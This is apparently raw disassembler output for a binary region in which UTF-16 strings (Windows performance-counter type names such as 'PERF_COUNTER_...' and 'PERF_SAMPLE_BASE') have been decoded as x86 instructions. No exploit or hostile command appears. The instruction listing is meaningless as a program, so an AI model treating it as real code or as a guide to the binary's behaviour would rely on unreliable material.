  401d21:	add    BYTE PTR [ecx],dh
  401d23:	add    BYTE PTR [eax],dh
  401d25:	add    BYTE PTR [eax],dh
  401d27:	add    BYTE PTR [esi+0x0],ch
  401d2a:	jae    0x401d2c
  401d2c:	pop    edi
  401d2d:	add    BYTE PTR [ecx+0x0],dh
  401d30:	jne    0x401d32
  401d32:	add    BYTE PTR gs:[ebp+0x0],dh
  401d36:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  401d3b:	add    BYTE PTR [esi+0x0],ch
  401d3e:	pop    edi
  401d3f:	add    BYTE PTR [eax+eax*1+0x79],dh
  401d43:	add    BYTE PTR [eax+0x0],dh
  401d46:	add    BYTE PTR gs:[eax],al
  401d49:	add    BYTE PTR [eax],al
  401d4b:	add    BYTE PTR [eax],al
  401d4d:	add    BYTE PTR [eax],al
  401d4f:	add    BYTE PTR [eax+0x0],dl
  401d52:	inc    ebp
  401d53:	add    BYTE PTR [edx+0x0],dl
  401d56:	inc    esi
  401d57:	add    BYTE PTR [edi+0x0],bl
  401d5a:	inc    ebx
  401d5b:	add    BYTE PTR [edi+0x0],cl
  401d5e:	push   ebp
  401d5f:	add    BYTE PTR [esi+0x0],cl
  401d62:	push   esp
  401d63:	add    BYTE PTR [ebp+0x0],al
  401d66:	push   edx
  401d67:	add    BYTE PTR [edi+0x0],bl
  401d6a:	xor    DWORD PTR [eax],eax
  401d6c:	xor    BYTE PTR [eax],al
  401d6e:	xor    BYTE PTR [eax],al
  401d70:	dec    esi
  401d71:	add    BYTE PTR [ebx+0x0],dl
  401d74:	pop    edi
  401d75:	add    BYTE PTR [ecx+0x0],dl
  401d78:	push   ebp
  401d79:	add    BYTE PTR [ebp+0x0],al
  401d7c:	push   ebp
  401d7d:	add    BYTE PTR [ebp+0x0],al
  401d80:	dec    esp
  401d81:	add    BYTE PTR [ebp+0x0],al
  401d84:	dec    esi
  401d85:	add    BYTE PTR [edi+0x0],bl
  401d88:	push   esp
  401d89:	add    BYTE PTR [ecx+0x0],bl
  401d8c:	push   eax
  401d8d:	add    BYTE PTR [ebp+0x0],al
	...
  401d98:	jo     0x401d9a
  401d9a:	add    BYTE PTR gs:[edx+0x0],dh
  401d9e:	data16 add BYTE PTR [edi+0x0],bl
  401da2:	arpl   WORD PTR [eax],ax
  401da4:	outs   dx,DWORD PTR ds:[esi]
  401da5:	add    BYTE PTR [ebp+0x0],dh
  401da8:	outs   dx,BYTE PTR ds:[esi]
  401da9:	add    BYTE PTR [eax+eax*1+0x65],dh
  401dad:	add    BYTE PTR [edx+0x0],dh
  401db0:	pop    edi
  401db1:	add    BYTE PTR [edi+0x0],ch
  401db4:	bound  eax,QWORD PTR [eax]
  401db6:	push   0x0
  401db8:	pop    edi
  401db9:	add    BYTE PTR [eax+eax*1+0x69],dh
  401dbd:	add    BYTE PTR [ebp+0x0],ch
  401dc0:	add    BYTE PTR gs:[edi+0x0],bl
  401dc4:	jno    0x401dc6
  401dc6:	jne    0x401dc8
  401dc8:	add    BYTE PTR gs:[ebp+0x0],dh
  401dcc:	add    BYTE PTR gs:[eax+eax*1+0x65],ch
  401dd1:	add    BYTE PTR [esi+0x0],ch
  401dd4:	pop    edi
  401dd5:	add    BYTE PTR [eax+eax*1+0x79],dh
  401dd9:	add    BYTE PTR [eax+0x0],dh
  401ddc:	add    BYTE PTR gs:[eax],al
  401ddf:	add    BYTE PTR [eax+0x0],dl
  401de2:	inc    ebp
  401de3:	add    BYTE PTR [edx+0x0],dl
  401de6:	inc    esi
  401de7:	add    BYTE PTR [edi+0x0],bl
  401dea:	inc    ebx
  401deb:	add    BYTE PTR [edi+0x0],cl
  401dee:	push   ebp
  401def:	add    BYTE PTR [esi+0x0],cl
  401df2:	push   esp
  401df3:	add    BYTE PTR [ebp+0x0],al
  401df6:	push   edx
  401df7:	add    BYTE PTR [edi+0x0],bl
  401dfa:	dec    edi
  401dfb:	add    BYTE PTR [edx+0x0],al
  401dfe:	dec    edx
  401dff:	add    BYTE PTR [edi+0x0],bl
  401e02:	push   esp
  401e03:	add    BYTE PTR [ecx+0x0],cl
  401e06:	dec    ebp
  401e07:	add    BYTE PTR [ebp+0x0],al
  401e0a:	pop    edi
  401e0b:	add    BYTE PTR [ecx+0x0],dl
  401e0e:	push   ebp
  401e0f:	add    BYTE PTR [ebp+0x0],al
  401e12:	push   ebp
  401e13:	add    BYTE PTR [ebp+0x0],al
  401e16:	dec    esp
  401e17:	add    BYTE PTR [ebp+0x0],al
  401e1a:	dec    esi
  401e1b:	add    BYTE PTR [edi+0x0],bl
  401e1e:	push   esp
  401e1f:	add    BYTE PTR [ecx+0x0],bl
  401e22:	push   eax
  401e23:	add    BYTE PTR [ebp+0x0],al
  401e26:	add    BYTE PTR [eax],al
  401e28:	jo     0x401e2a
  401e2a:	add    BYTE PTR gs:[edx+0x0],dh
  401e2e:	data16 add BYTE PTR [edi+0x0],bl
  401e32:	arpl   WORD PTR [eax],ax
  401e34:	outs   dx,DWORD PTR ds:[esi]
  401e35:	add    BYTE PTR [ebp+0x0],dh
  401e38:	outs   dx,BYTE PTR ds:[esi]
  401e39:	add    BYTE PTR [eax+eax*1+0x65],dh
  401e3d:	add    BYTE PTR [edx+0x0],dh
  401e40:	pop    edi
  401e41:	add    BYTE PTR [edx+0x0],ah
  401e44:	jne    0x401e46
  401e46:	ins    BYTE PTR es:[edi],dx
  401e47:	add    BYTE PTR [ebx+0x0],ch
  401e4a:	pop    edi
  401e4b:	add    BYTE PTR [ebx+0x0],ah
  401e4e:	outs   dx,DWORD PTR ds:[esi]
  401e4f:	add    BYTE PTR [ebp+0x0],dh
  401e52:	outs   dx,BYTE PTR ds:[esi]
  401e53:	add    BYTE PTR [eax+eax*1+0x0],dh
  401e57:	add    BYTE PTR [eax+0x0],dl
  401e5a:	inc    ebp
  401e5b:	add    BYTE PTR [edx+0x0],dl
  401e5e:	inc    esi
  401e5f:	add    BYTE PTR [edi+0x0],bl
  401e62:	inc    ebx
  401e63:	add    BYTE PTR [edi+0x0],cl
  401e66:	push   ebp
  401e67:	add    BYTE PTR [esi+0x0],cl
  401e6a:	push   esp
  401e6b:	add    BYTE PTR [ebp+0x0],al
  401e6e:	push   edx
  401e6f:	add    BYTE PTR [edi+0x0],bl
  401e72:	inc    edx
  401e73:	add    BYTE PTR [ebp+0x0],dl
  401e76:	dec    esp
  401e77:	add    BYTE PTR [ebx+0x0],cl
  401e7a:	pop    edi
  401e7b:	add    BYTE PTR [ebx+0x0],al
  401e7e:	dec    edi
  401e7f:	add    BYTE PTR [ebp+0x0],dl
  401e82:	dec    esi
  401e83:	add    BYTE PTR [eax+eax*1+0x0],dl
  401e87:	add    BYTE PTR [eax+0x0],dh
  401e8a:	add    BYTE PTR gs:[edx+0x0],dh
  401e8e:	data16 add BYTE PTR [edi+0x0],bl
  401e92:	arpl   WORD PTR [eax],ax
  401e94:	outs   dx,DWORD PTR ds:[esi]
  401e95:	add    BYTE PTR [ebp+0x0],dh
  401e98:	outs   dx,BYTE PTR ds:[esi]
  401e99:	add    BYTE PTR [eax+eax*1+0x65],dh
  401e9d:	add    BYTE PTR [edx+0x0],dh
  401ea0:	pop    edi
  401ea1:	add    BYTE PTR [eax+eax*1+0x65],dh
  401ea5:	add    BYTE PTR [eax+0x0],bh
  401ea8:	je     0x401eaa
  401eaa:	add    BYTE PTR [eax],al
  401eac:	push   eax
  401ead:	add    BYTE PTR [ebp+0x0],al
  401eb0:	push   edx
  401eb1:	add    BYTE PTR [esi+0x0],al
  401eb4:	pop    edi
  401eb5:	add    BYTE PTR [ebx+0x0],al
  401eb8:	dec    edi
  401eb9:	add    BYTE PTR [ebp+0x0],dl
  401ebc:	dec    esi
  401ebd:	add    BYTE PTR [eax+eax*1+0x45],dl
  401ec1:	add    BYTE PTR [edx+0x0],dl
  401ec4:	pop    edi
  401ec5:	add    BYTE PTR [eax+eax*1+0x45],dl
  401ec9:	add    BYTE PTR [eax+0x0],bl
  401ecc:	push   esp
  401ecd:	add    BYTE PTR [eax],al
  401ecf:	add    BYTE PTR [eax+0x0],dh
  401ed2:	add    BYTE PTR gs:[edx+0x0],dh
  401ed6:	data16 add BYTE PTR [edi+0x0],bl
  401eda:	arpl   WORD PTR [eax],ax
  401edc:	outs   dx,DWORD PTR ds:[esi]
  401edd:	add    BYTE PTR [ebp+0x0],dh
  401ee0:	outs   dx,BYTE PTR ds:[esi]
  401ee1:	add    BYTE PTR [eax+eax*1+0x65],dh
  401ee5:	add    BYTE PTR [edx+0x0],dh
  401ee8:	pop    edi
  401ee9:	add    BYTE PTR [edx+0x0],dh
  401eec:	popa   
  401eed:	add    BYTE PTR [edi+0x0],dh
  401ef0:	arpl   WORD PTR [eax],ax
  401ef2:	outs   dx,DWORD PTR ds:[esi]
  401ef3:	add    BYTE PTR [ebp+0x0],dh
  401ef6:	outs   dx,BYTE PTR ds:[esi]
  401ef7:	add    BYTE PTR [eax+eax*1+0x0],dh
  401efb:	add    BYTE PTR [eax+0x0],dl
  401efe:	inc    ebp
  401eff:	add    BYTE PTR [edx+0x0],dl
  401f02:	inc    esi
  401f03:	add    BYTE PTR [edi+0x0],bl
  401f06:	inc    ebx
  401f07:	add    BYTE PTR [edi+0x0],cl
  401f0a:	push   ebp
  401f0b:	add    BYTE PTR [esi+0x0],cl
  401f0e:	push   esp
  401f0f:	add    BYTE PTR [ebp+0x0],al
  401f12:	push   edx
  401f13:	add    BYTE PTR [edi+0x0],bl
  401f16:	push   edx
  401f17:	add    BYTE PTR [ecx+0x0],al
  401f1a:	push   edi
  401f1b:	add    BYTE PTR [ebx+0x0],al
  401f1e:	dec    edi
  401f1f:	add    BYTE PTR [ebp+0x0],dl
  401f22:	dec    esi
  401f23:	add    BYTE PTR [eax+eax*1+0x0],dl
  401f27:	add    BYTE PTR [eax+0x0],dh
  401f2a:	add    BYTE PTR gs:[edx+0x0],dh
  401f2e:	data16 add BYTE PTR [edi+0x0],bl
  401f32:	arpl   WORD PTR [eax],ax
  401f34:	outs   dx,DWORD PTR ds:[esi]
  401f35:	add    BYTE PTR [ebp+0x0],dh
  401f38:	outs   dx,BYTE PTR ds:[esi]
  401f39:	add    BYTE PTR [eax+eax*1+0x65],dh
  401f3d:	add    BYTE PTR [edx+0x0],dh
  401f40:	pop    edi
  401f41:	add    BYTE PTR [eax+eax*1+0x61],ch
  401f45:	add    BYTE PTR [edx+0x0],dh
  401f48:	add    BYTE PTR [di+0x0],ah
  401f4c:	pop    edi
  401f4d:	add    BYTE PTR [edx+0x0],dh
  401f50:	popa   
  401f51:	add    BYTE PTR [edi+0x0],dh
  401f54:	arpl   WORD PTR [eax],ax
  401f56:	outs   dx,DWORD PTR ds:[esi]
  401f57:	add    BYTE PTR [ebp+0x0],dh
  401f5a:	outs   dx,BYTE PTR ds:[esi]
  401f5b:	add    BYTE PTR [eax+eax*1+0x0],dh
  401f5f:	add    BYTE PTR [eax+0x0],dl
  401f62:	inc    ebp
  401f63:	add    BYTE PTR [edx+0x0],dl
  401f66:	inc    esi
  401f67:	add    BYTE PTR [edi+0x0],bl
  401f6a:	inc    ebx
  401f6b:	add    BYTE PTR [edi+0x0],cl
  401f6e:	push   ebp
  401f6f:	add    BYTE PTR [esi+0x0],cl
  401f72:	push   esp
  401f73:	add    BYTE PTR [ebp+0x0],al
  401f76:	push   edx
  401f77:	add    BYTE PTR [edi+0x0],bl
  401f7a:	dec    esp
  401f7b:	add    BYTE PTR [ecx+0x0],al
  401f7e:	push   edx
  401f7f:	add    BYTE PTR [edi+0x0],al
  401f82:	inc    ebp
  401f83:	add    BYTE PTR [edi+0x0],bl
  401f86:	push   edx
  401f87:	add    BYTE PTR [ecx+0x0],al
  401f8a:	push   edi
  401f8b:	add    BYTE PTR [ebx+0x0],al
  401f8e:	dec    edi
  401f8f:	add    BYTE PTR [ebp+0x0],dl
  401f92:	dec    esi
  401f93:	add    BYTE PTR [eax+eax*1+0x0],dl
  401f97:	add    BYTE PTR [eax+0x0],dh
  401f9a:	add    BYTE PTR gs:[edx+0x0],dh
  401f9e:	data16 add BYTE PTR [edi+0x0],bl
  401fa2:	arpl   WORD PTR [eax],ax
  401fa4:	outs   dx,DWORD PTR ds:[esi]
  401fa5:	add    BYTE PTR [ebp+0x0],dh
  401fa8:	outs   dx,BYTE PTR ds:[esi]
  401fa9:	add    BYTE PTR [eax+eax*1+0x65],dh
  401fad:	add    BYTE PTR [edx+0x0],dh
  401fb0:	pop    edi
  401fb1:	add    BYTE PTR [edx+0x0],dh
  401fb4:	popa   
  401fb5:	add    BYTE PTR [edi+0x0],dh
  401fb8:	arpl   WORD PTR [eax],ax
  401fba:	outs   dx,DWORD PTR ds:[esi]
  401fbb:	add    BYTE PTR [ebp+0x0],dh
  401fbe:	outs   dx,BYTE PTR ds:[esi]
  401fbf:	add    BYTE PTR [eax+eax*1+0x5f],dh
  401fc3:	add    BYTE PTR [eax+0x0],ch
  401fc6:	add    BYTE PTR gs:[eax+0x0],bh
  401fca:	add    BYTE PTR [eax],al
  401fcc:	push   eax
  401fcd:	add    BYTE PTR [ebp+0x0],al
  401fd0:	push   edx
  401fd1:	add    BYTE PTR [esi+0x0],al
  401fd4:	pop    edi
  401fd5:	add    BYTE PTR [ebx+0x0],al
  401fd8:	dec    edi
  401fd9:	add    BYTE PTR [ebp+0x0],dl
  401fdc:	dec    esi
  401fdd:	add    BYTE PTR [eax+eax*1+0x45],dl
  401fe1:	add    BYTE PTR [edx+0x0],dl
  401fe4:	pop    edi
  401fe5:	add    BYTE PTR [edx+0x0],dl
  401fe8:	inc    ecx
  401fe9:	add    BYTE PTR [edi+0x0],dl
  401fec:	inc    ebx
  401fed:	add    BYTE PTR [edi+0x0],cl
  401ff0:	push   ebp
  401ff1:	add    BYTE PTR [esi+0x0],cl
  401ff4:	push   esp
  401ff5:	add    BYTE PTR [edi+0x0],bl
  401ff8:	dec    eax
  401ff9:	add    BYTE PTR [ebp+0x0],al
  401ffc:	pop    eax
  401ffd:	add    BYTE PTR [eax],al
  401fff:	add    BYTE PTR [eax+0x0],dh
  402002:	add    BYTE PTR gs:[edx+0x0],dh
  402006:	data16 add BYTE PTR [edi+0x0],bl
  40200a:	arpl   WORD PTR [eax],ax
  40200c:	outs   dx,DWORD PTR ds:[esi]
  40200d:	add    BYTE PTR [ebp+0x0],dh
  402010:	outs   dx,BYTE PTR ds:[esi]
  402011:	add    BYTE PTR [eax+eax*1+0x65],dh
  402015:	add    BYTE PTR [edx+0x0],dh
  402018:	pop    edi
  402019:	add    BYTE PTR [eax+eax*1+0x61],ch
  40201d:	add    BYTE PTR [edx+0x0],dh
  402020:	add    BYTE PTR [di+0x0],ah
  402024:	pop    edi
  402025:	add    BYTE PTR [edx+0x0],dh
  402028:	popa   
  402029:	add    BYTE PTR [edi+0x0],dh
  40202c:	arpl   WORD PTR [eax],ax
  40202e:	outs   dx,DWORD PTR ds:[esi]
  40202f:	add    BYTE PTR [ebp+0x0],dh
  402032:	outs   dx,BYTE PTR ds:[esi]
  402033:	add    BYTE PTR [eax+eax*1+0x5f],dh
  402037:	add    BYTE PTR [eax+0x0],ch
  40203a:	add    BYTE PTR gs:[eax+0x0],bh
  40203e:	add    BYTE PTR [eax],al
  402040:	push   eax
  402041:	add    BYTE PTR [ebp+0x0],al
  402044:	push   edx
  402045:	add    BYTE PTR [esi+0x0],al
  402048:	pop    edi
  402049:	add    BYTE PTR [ebx+0x0],al
  40204c:	dec    edi
  40204d:	add    BYTE PTR [ebp+0x0],dl
  402050:	dec    esi
  402051:	add    BYTE PTR [eax+eax*1+0x45],dl
  402055:	add    BYTE PTR [edx+0x0],dl
  402058:	pop    edi
  402059:	add    BYTE PTR [eax+eax*1+0x41],cl
  40205d:	add    BYTE PTR [edx+0x0],dl
  402060:	inc    edi
  402061:	add    BYTE PTR [ebp+0x0],al
  402064:	pop    edi
  402065:	add    BYTE PTR [edx+0x0],dl
  402068:	inc    ecx
  402069:	add    BYTE PTR [edi+0x0],dl
  40206c:	inc    ebx
  40206d:	add    BYTE PTR [edi+0x0],cl
  402070:	push   ebp
  402071:	add    BYTE PTR [esi+0x0],cl
  402074:	push   esp
  402075:	add    BYTE PTR [edi+0x0],bl
  402078:	dec    eax
  402079:	add    BYTE PTR [ebp+0x0],al
  40207c:	pop    eax
  40207d:	add    BYTE PTR [eax],al
  40207f:	add    BYTE PTR [eax+0x0],dh
  402082:	add    BYTE PTR gs:[edx+0x0],dh
  402086:	data16 add BYTE PTR [edi+0x0],bl
  40208a:	jae    0x40208c
  40208c:	popa   
  40208d:	add    BYTE PTR [ebp+0x0],ch
  402090:	jo     0x402092
  402092:	ins    BYTE PTR es:[edi],dx
  402093:	add    BYTE PTR [ebp+0x0],ah
  402096:	pop    edi
  402097:	add    BYTE PTR [esi+0x0],ah
  40209a:	jb     0x40209c
  40209c:	popa   
  40209d:	add    BYTE PTR [ebx+0x0],ah
  4020a0:	je     0x4020a2
  4020a2:	imul   eax,DWORD PTR [eax],0x6e006f
  4020a8:	add    BYTE PTR [eax],al
  4020aa:	add    BYTE PTR [eax],al
  4020ac:	push   eax
  4020ad:	add    BYTE PTR [ebp+0x0],al
  4020b0:	push   edx
  4020b1:	add    BYTE PTR [esi+0x0],al
  4020b4:	pop    edi
  4020b5:	add    BYTE PTR [ebx+0x0],dl
  4020b8:	inc    ecx
  4020b9:	add    BYTE PTR [ebp+0x0],cl
  4020bc:	push   eax
  4020bd:	add    BYTE PTR [eax+eax*1+0x45],cl
  4020c1:	add    BYTE PTR [edi+0x0],bl
  4020c4:	inc    esi
  4020c5:	add    BYTE PTR [edx+0x0],dl
  4020c8:	inc    ecx
  4020c9:	add    BYTE PTR [ebx+0x0],al
  4020cc:	push   esp
  4020cd:	add    BYTE PTR [ecx+0x0],cl
  4020d0:	dec    edi
  4020d1:	add    BYTE PTR [esi+0x0],cl
  4020d4:	add    BYTE PTR [eax],al
  4020d6:	add    BYTE PTR [eax],al
  4020d8:	jo     0x4020da
  4020da:	add    BYTE PTR gs:[edx+0x0],dh
  4020de:	data16 add BYTE PTR [edi+0x0],bl
  4020e2:	jae    0x4020e4
  4020e4:	popa   
  4020e5:	add    BYTE PTR [ebp+0x0],ch
  4020e8:	jo     0x4020ea
  4020ea:	ins    BYTE PTR es:[edi],dx
  4020eb:	add    BYTE PTR [ebp+0x0],ah
  4020ee:	pop    edi
  4020ef:	add    BYTE PTR [ebx+0x0],ah
  4020f2:	outs   dx,DWORD PTR ds:[esi]
  4020f3:	add    BYTE PTR [ebp+0x0],dh
  4020f6:	outs   dx,BYTE PTR ds:[esi]
  4020f7:	add    BYTE PTR [eax+eax*1+0x65],dh
  4020fb:	add    BYTE PTR [edx+0x0],dh
  4020fe:	add    BYTE PTR [eax],al
  402100:	push   eax
  402101:	add    BYTE PTR [ebp+0x0],al
  402104:	push   edx
  402105:	add    BYTE PTR [esi+0x0],al
  402108:	pop    edi
  402109:	add    BYTE PTR [ebx+0x0],dl
  40210c:	inc    ecx
  40210d:	add    BYTE PTR [ebp+0x0],cl
  402110:	push   eax
  402111:	add    BYTE PTR [eax+eax*1+0x45],cl
  402115:	add    BYTE PTR [edi+0x0],bl
  402118:	inc    ebx
  402119:	add    BYTE PTR [edi+0x0],cl
  40211c:	push   ebp
  40211d:	add    BYTE PTR [esi+0x0],cl
  402120:	push   esp
  402121:	add    BYTE PTR [ebp+0x0],al
  402124:	push   edx
  402125:	add    BYTE PTR [eax],al
  402127:	add    BYTE PTR [eax+0x0],dh
  40212a:	add    BYTE PTR gs:[edx+0x0],dh
  40212e:	data16 add BYTE PTR [edi+0x0],bl
  402132:	arpl   WORD PTR [eax],ax
  402134:	outs   dx,DWORD PTR ds:[esi]
  402135:	add    BYTE PTR [ebp+0x0],dh
  402138:	outs   dx,BYTE PTR ds:[esi]
  402139:	add    BYTE PTR [eax+eax*1+0x65],dh
  40213d:	add    BYTE PTR [edx+0x0],dh
  402140:	pop    edi
  402141:	add    BYTE PTR [eax+eax*1+0x69],dh
  402145:	add    BYTE PTR [ebp+0x0],ch
  402148:	add    BYTE PTR gs:[edx+0x0],dh
  40214c:	pop    edi
  40214d:	add    BYTE PTR [ecx+0x0],ch
  402150:	outs   dx,BYTE PTR ds:[esi]
  402151:	add    BYTE PTR [esi+0x0],dh
  402154:	add    BYTE PTR [eax],al
  402156:	add    BYTE PTR [eax],al
  402158:	push   eax
  402159:	add    BYTE PTR [ebp+0x0],al
  40215c:	push   edx
  40215d:	add    BYTE PTR [esi+0x0],al
  402160:	pop    edi
  402161:	add    BYTE PTR [ebx+0x0],al
  402164:	dec    edi
  402165:	add    BYTE PTR [ebp+0x0],dl
  402168:	dec    esi
  402169:	add    BYTE PTR [eax+eax*1+0x45],dl
  40216d:	add    BYTE PTR [edx+0x0],dl
  402170:	pop    edi
  402171:	add    BYTE PTR [eax+eax*1+0x49],dl
  402175:	add    BYTE PTR [ebp+0x0],cl
  402178:	inc    ebp
  402179:	add    BYTE PTR [edx+0x0],dl
  40217c:	pop    edi
  40217d:	add    BYTE PTR [ecx+0x0],cl
  402180:	dec    esi
  402181:	add    BYTE PTR [esi+0x0],dl
  402184:	add    BYTE PTR [eax],al
  402186:	add    BYTE PTR [eax],al
  402188:	jo     0x40218a
  40218a:	add    BYTE PTR gs:[edx+0x0],dh
  40218e:	data16 add BYTE PTR [edi+0x0],bl
  402192:	jae    0x402194
  402194:	popa   
  402195:	add    BYTE PTR [ebp+0x0],ch
  402198:	jo     0x40219a
  40219a:	ins    BYTE PTR es:[edi],dx
  40219b:	add    BYTE PTR [ebp+0x0],ah
  40219e:	pop    edi
  40219f:	add    BYTE PTR [edx+0x0],ah
  4021a2:	popa   
  4021a3:	add    BYTE PTR [ebx+0x0],dh
  4021a6:	add    BYTE PTR gs:[eax],al
  4021a9:	add    BYTE PTR [eax],al
  4021ab:	add    BYTE PTR [eax+0x0],dl
  4021ae:	inc    ebp
  4021af:	add    BYTE PTR [edx+0x0],dl
  4021b2:	inc    esi
  4021b3:	add    BYTE PTR [edi+0x0],bl
  4021b6:	push   ebx
  4021b7:	add    BYTE PTR [ecx+0x0],al
  4021ba:	dec    ebp
  4021bb:	add    BYTE PTR [eax+0x0],dl
  4021be:	dec    esp
  4021bf:	add    BYTE PTR [ebp+0x0],al
  4021c2:	pop    edi
  4021c3:	add    BYTE PTR [edx+0x0],al
  4021c6:	inc    ecx
  4021c7:	add    BYTE PTR [ebx+0x0],dl
  4021ca:	inc    ebp
  4021cb:	add    BYTE PTR [eax],al
  4021cd:	add    BYTE PTR [eax],al
  4021cf:	add    BYTE PTR [eax+0x0],dh
  4021d2:	add    BYTE PTR gs:[edx+0x0],dh
  4021d6:	data16 add BYTE PTR [edi+0x0],bl
  4021da:	popa   
  4021db:	add    BYTE PTR [esi+0x0],dh
  4021de:	add    BYTE PTR gs:[edx+0x0],dh
  4021e2:	popa   
  4021e3:	add    BYTE PTR [edi+0x0],ah
  4021e6:	add    BYTE PTR gs:[edi+0x0],bl
  4021ea:	je     0x4021ec
  4021ec:	imul   eax,DWORD PTR [eax],0x65006d
  4021f2:	jb     0x4021f4
  4021f4:	add    BYTE PTR [eax],al
  4021f6:	add    BYTE PTR [eax],al
  4021f8:	push   eax
  4021f9:	add    BYTE PTR [ebp+0x0],al
  4021fc:	push   edx
  4021fd:	add    BYTE PTR [esi+0x0],al
  402200:	pop    edi
  402201:	add    BYTE PTR [ecx+0x0],al
  402204:	push   esi
  402205:	add    BYTE PTR [ebp+0x0],al
  402208:	push   edx
  402209:	add    BYTE PTR [ecx+0x0],al
  40220c:	inc    edi
  40220d:	add    BYTE PTR [ebp+0x0],al
  402210:	pop    edi
  402211:	add    BYTE PTR [eax+eax*1+0x49],dl
  402215:	add    BYTE PTR [ebp+0x0],cl
  402218:	inc    ebp
  402219:	add    BYTE PTR [edx+0x0],dl
  40221c:	add    BYTE PTR [eax],al
  40221e:	add    BYTE PTR [eax],al
  402220:	jo     0x402222
  402222:	add    BYTE PTR gs:[edx+0x0],dh
  402226:	data16 add BYTE PTR [edi+0x0],bl
  40222a:	popa   
  40222b:	add    BYTE PTR [esi+0x0],dh
  40222e:	add    BYTE PTR gs:[edx+0x0],dh
  402232:	popa   
  402233:	add    BYTE PTR [edi+0x0],ah
  402236:	add    BYTE PTR gs:[edi+0x0],bl
  40223a:	bound  eax,QWORD PTR [eax]
  40223c:	popa   
  40223d:	add    BYTE PTR [ebx+0x0],dh
  402240:	add    BYTE PTR gs:[eax],al
  402243:	add    BYTE PTR [eax+0x0],dl
  402246:	inc    ebp
  402247:	add    BYTE PTR [edx+0x0],dl
  40224a:	inc    esi
  40224b:	add    BYTE PTR [edi+0x0],bl
  40224e:	inc    ecx
  40224f:	add    BYTE PTR [esi+0x0],dl
  402252:	inc    ebp
  402253:	add    BYTE PTR [edx+0x0],dl
  402256:	inc    ecx
  402257:	add    BYTE PTR [edi+0x0],al
  40225a:	inc    ebp
  40225b:	add    BYTE PTR [edi+0x0],bl
  40225e:	inc    edx
  40225f:	add    BYTE PTR [ecx+0x0],al
  402262:	push   ebx
  402263:	add    BYTE PTR [ebp+0x0],al
  402266:	add    BYTE PTR [eax],al
  402268:	jo     0x40226a
  40226a:	add    BYTE PTR gs:[edx+0x0],dh
  40226e:	data16 add BYTE PTR [edi+0x0],bl
  402272:	popa   
  402273:	add    BYTE PTR [esi+0x0],dh
  402276:	add    BYTE PTR gs:[edx+0x0],dh
  40227a:	popa   
  40227b:	add    BYTE PTR [edi+0x0],ah
  40227e:	add    BYTE PTR gs:[edi+0x0],bl
  402282:	bound  eax,QWORD PTR [eax]
  402284:	jne    0x402286
  402286:	ins    BYTE PTR es:[edi],dx
  402287:	add    BYTE PTR [ebx+0x0],ch
  40228a:	add    BYTE PTR [eax],al
  40228c:	push   eax
  40228d:	add    BYTE PTR [ebp+0x0],al
  402290:	push   edx
  402291:	add    BYTE PTR [esi+0x0],al
  402294:	pop    edi
  402295:	add    BYTE PTR [ecx+0x0],al
  402298:	push   esi
  402299:	add    BYTE PTR [ebp+0x0],al
  40229c:	push   edx
  40229d:	add    BYTE PTR [ecx+0x0],al
  4022a0:	inc    edi
  4022a1:	add    BYTE PTR [ebp+0x0],al
  4022a4:	pop    edi
  4022a5:	add    BYTE PTR [edx+0x0],al
  4022a8:	push   ebp
  4022a9:	add    BYTE PTR [eax+eax*1+0x4b],cl
  4022ad:	add    BYTE PTR [eax],al
  4022af:	add    BYTE PTR [eax+0x0],dh
  4022b2:	add    BYTE PTR gs:[edx+0x0],dh
  4022b6:	data16 add BYTE PTR [edi+0x0],bl
  4022ba:	outs   dx,DWORD PTR ds:[esi]
  4022bb:	add    BYTE PTR [edx+0x0],ah
  4022be:	push   0x0
  4022c0:	pop    edi
  4022c1:	add    BYTE PTR [eax+eax*1+0x69],dh
  4022c5:	add    BYTE PTR [ebp+0x0],ch
  4022c8:	add    BYTE PTR gs:[edi+0x0],bl
  4022cc:	je     0x4022ce
  4022ce:	imul   eax,DWORD PTR [eax],0x65006d
  4022d4:	jb     0x4022d6
  4022d6:	add    BYTE PTR [eax],al
  4022d8:	push   eax
  4022d9:	add    BYTE PTR [ebp+0x0],al
  4022dc:	push   edx
  4022dd:	add    BYTE PTR [esi+0x0],al
  4022e0:	pop    edi
  4022e1:	add    BYTE PTR [edi+0x0],cl
  4022e4:	inc    edx
  4022e5:	add    BYTE PTR [edx+0x0],cl
  4022e8:	pop    edi
  4022e9:	add    BYTE PTR [eax+eax*1+0x49],dl
  4022ed:	add    BYTE PTR [ebp+0x0],cl
  4022f0:	inc    ebp
  4022f1:	add    BYTE PTR [edi+0x0],bl
  4022f4:	push   esp
  4022f5:	add    BYTE PTR [ecx+0x0],cl
  4022f8:	dec    ebp
  4022f9:	add    BYTE PTR [ebp+0x0],al
  4022fc:	push   edx
  4022fd:	add    BYTE PTR [eax],al
  4022ff:	add    BYTE PTR [eax+0x0],dh
  402302:	add    BYTE PTR gs:[edx+0x0],dh
  402306:	data16 add BYTE PTR [edi+0x0],bl
  40230a:	xor    DWORD PTR [eax],eax
  40230c:	xor    BYTE PTR [eax],al
  40230e:	xor    BYTE PTR [eax],al
  402310:	outs   dx,BYTE PTR ds:[esi]
  402311:	add    BYTE PTR [ebx+0x0],dh
  402314:	add    BYTE PTR gs:[ebx+0x0],ah
  402318:	pop    edi
  402319:	add    BYTE PTR [eax+eax*1+0x69],dh
  40231d:	add    BYTE PTR [ebp+0x0],ch
  402320:	add    BYTE PTR gs:[edx+0x0],dh
  402324:	add    BYTE PTR [eax],al
  402326:	add    BYTE PTR [eax],al
  402328:	push   eax
  402329:	add    BYTE PTR [ebp+0x0],al
  40232c:	push   edx
  40232d:	add    BYTE PTR [esi+0x0],al
  402330:	pop    edi
  402331:	add    BYTE PTR [ecx],dh
  402333:	add    BYTE PTR [eax],dh
  402335:	add    BYTE PTR [eax],dh
  402337:	add    BYTE PTR [esi+0x0],cl
  40233a:	push   ebx
  40233b:	add    BYTE PTR [ebp+0x0],al
  40233e:	inc    ebx
  40233f:	add    BYTE PTR [edi+0x0],bl
  402342:	push   esp
  402343:	add    BYTE PTR [ecx+0x0],cl
  402346:	dec    ebp
  402347:	add    BYTE PTR [ebp+0x0],al
  40234a:	push   edx
  40234b:	add    BYTE PTR [eax],al
  40234d:	add    BYTE PTR [eax],al
  40234f:	add    BYTE PTR [eax+0x0],dh
  402352:	add    BYTE PTR gs:[edx+0x0],dh
  402356:	data16 add BYTE PTR [edi+0x0],bl
  40235a:	xor    DWORD PTR [eax],eax
  40235c:	xor    BYTE PTR [eax],al
  40235e:	xor    BYTE PTR [eax],al
  402360:	outs   dx,BYTE PTR ds:[esi]
  402361:	add    BYTE PTR [ebx+0x0],dh
